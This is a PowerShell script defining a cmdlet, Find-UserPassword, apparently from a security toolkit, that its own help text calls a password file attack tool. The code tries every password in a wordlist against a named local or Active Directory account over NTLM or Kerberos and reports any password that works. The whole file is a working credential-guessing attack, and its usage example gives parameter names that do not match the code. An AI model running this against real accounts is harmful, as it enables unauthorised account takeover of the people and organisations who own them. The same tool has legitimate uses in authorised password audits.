Set-StrictMode -Version 2

function Find-UserPassword
{
    <#
        .SYNOPSIS
        Test a user account against entries in a specified file. Users could be local or domain user accounts.

        .DESCRIPTION
        This CMDLet is basically a simple password file attack tool, allowing for the testing of a password list 
        against specified Active Directory identities, Active Directory User names (SAM) or local user accounts.

        This CMDLet makes use of the Test-UserCredential CMDLet and specifies its parameters accordingly.

        This CMDLet supports using Kerberos and NTLM,

        .PARAMETER Username
        Username to try.

        .PARAMETER PasswordFile
        Password list/file.

        .PARAMETER Domain
        If this flag is set the user credentials should be a domain user account.

        .PARAMETER UseKerberos
        By default NTLM is used. Specify this switch to attempt kerberos authentication. 

        This is only used with the 'Domain' parameter.

        You may need to specify domain\user.

        .EXAMPLE
        PS C:\> Find-UserPassword -Identify kieran.jacobsen -Password c:\passwordlist.txt

        .INPUTS
        Microsoft.ActiveDirectory.Management.ADUser

        .OUTPUTS
        PSObject

        .LINK
        http://poshsecurity.com
    #>

    [CmdletBinding()]
    [OutputType([PSObject])]
    Param
    (
        [Parameter(Mandatory = $True, valuefrompipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String] 
        $Username,

        [Parameter(Mandatory = $True)]
        [ValidateScript({Test-Path $_})]
        [String]
        $PasswordFile,

        [Parameter(Mandatory = $False)]
        [Switch] $Domain,

        [Parameter(Mandatory = $False)]
        [Switch] $UseKerberos

    )

    Begin
    {
        Write-Verbose -Message "Using Password File $PasswordFile"
        $Passwords = Get-Content -Path $PasswordFile
        $TotalPasswords = ($Passwords | Measure-Object).count
        Write-Verbose -Message "Total Passwords is $TotalPasswords"
        
        # If the password file was blank, throw an error
        if ($TotalPasswords -eq 0)
        { throw 'No Passwords Provided' }

        # If -domain isn't specified, then we don't need -UseKerberos (as per Test-UserCredental)
        if (-not $Domain -and $UseKerberos)
        { throw 'You can only specify -UserKerberos with -Domain' }
    }

    Process 
    {
        Write-Verbose -Message "Testing Passwords for user $Username"
        
        $PasswordsProcessed = 0
        $PasswordFound = $False

        While ((-not $PasswordFound) -and ($PasswordsProcessed -lt $TotalPasswords))
        {
            Write-Verbose -Message "Passwords processed $PasswordsProcessed"
            
            if ($TotalPasswords -gt 1) 
            { 
                # Write the percentage through the number of passwords
                $PasswordPercentage = $PasswordsProcessed / $TotalPasswords * 100
                Write-Progress -Activity 'Testing Password' -PercentComplete $PasswordPercentage -Status "$PasswordPercentage % Complete" -ParentId 1 
            
                # Get the next password
                $PasswordAttempt = $Passwords[($PasswordsProcessed )]
            }

            # Whilst this might not make sense, if there was a single password in the file, we don't want to index into the single password.
            if ($TotalPasswords -eq 1) 
            { $PasswordAttempt = $Passwords }

            Write-Verbose -Message "Attempting password $PasswordAttempt"

            # Encrypt the password and then send it to test-usercredential with the appropriate parameters
            $SecureStringPassword = ConvertTo-SecureString -String $PasswordAttempt -AsPlainText -Force
            $PasswordFound = Test-UserCredential -Username $Username -Password $SecureStringPassword -Domain:$Domain -UseKerberos:$UseKerberos

            #Increment process count
            $PasswordsProcessed++
        }

        if ($TotalPasswords -ne 1) 
        { Write-Progress -Activity 'Testing Password' -ParentId 1 -Completed }

        # If the password wasn't found, set the password attempt field to an empty string
        if (-not $PasswordFound) 
        { $PasswordAttempt = '' }

        # Create a custom PS object to return
        $ReturnUser = New-Object -TypeName PSObject
        $ReturnUser | Add-Member -NotePropertyName Username -NotePropertyValue $Username -Force      
        $ReturnUser | Add-Member -NotePropertyName PasswordFound -NotePropertyValue $PasswordFound -Force
        $ReturnUser | Add-Member -NotePropertyName Password -NotePropertyValue $PasswordAttempt -Force

        # Return the object
        $ReturnUser
    }
}


